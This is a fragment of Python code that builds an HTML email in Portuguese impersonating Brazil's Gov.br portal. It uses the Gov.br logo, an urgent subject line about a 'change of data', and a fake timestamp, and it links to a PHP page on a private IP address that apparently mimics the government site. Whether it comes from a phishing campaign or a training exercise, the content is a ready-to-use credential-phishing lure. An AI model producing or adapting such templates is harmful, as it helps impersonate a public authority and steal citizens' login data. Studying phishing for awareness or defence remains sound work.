...
destinatario = "miguelmenossi567@gmail.com"

# Criando mensagem
mensagem = MIMEMultipart('alternative')
mensagem["From"] = remetente
mensagem["To"] = destinatario
mensagem["Subject"] = "AVISO IMPORTANTE: ALTERAÇÃO DE DADOS"
...
<div class="logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/3840px-Gov.br_logo.svg.png"l alt="logo" width="200">
</div>
...
<p>
Operação realizada em 27/02/2026 às 8:30
</p>
...
<a href="https://10.58.47.24/gov/gov.br.php" class="link">
